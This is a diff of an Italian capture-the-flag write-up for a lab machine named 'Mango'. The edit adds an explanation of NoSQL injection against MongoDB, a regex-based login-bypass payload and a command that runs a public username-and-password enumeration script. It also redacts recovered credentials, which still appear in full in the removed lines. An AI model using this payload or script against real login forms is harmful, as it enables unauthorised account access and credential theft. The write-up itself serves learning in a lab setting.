@@ -12,13 +12,20 @@ Ed ecco rilevato un form di login.
 
 ## Web Exploitation
 
-Per associazione, il nome della macchina "Mango" ovviamene mi suona come il nome del DB "Mongo" quindi dopo un po di ricerche trovo questo exploit per l' [Username e Password Enumeration in MongoDB](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration/blob/master/nosqli-user-pass-enum.py) che banalmente fa:
+Per associazione, il nome della macchina "Mango" ovviamene mi suona come il nome del DB "Mongo". Mongo è un tipo di DB non-relazionare (quindi non produce strutture dati ma produce JSON).Trattandosi di un DB NoSQL sfrutto le regex per fare Injection con query del tipo:
+```
+username[$regex]:^<CHAR>.*&password[$ne]:1&login:login
+```
 
-* 
-*
-*
+Dopo un po di ricerche trovo questo exploit per l' [Username e Password Enumeration in MongoDB](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration/blob/master/nosqli-user-pass-enum.py) che banalmente fa quello enunciato precedentemente ma tutto automatizzato:
+
+```
+nosqli-user-pass-enum.py -u http://HOST/# -up username -pp password -ep <CHOOSE> -op login:login -m POST
+```
 
 Tramite l'exploit trovo i seguenti dati:
+
 ```
-admin:h3mXK8RhU~f{]f5H
-mango:t9KcS3>!0B#2
+admin:h3[...]5H
+mango:t9[...]#2
+```
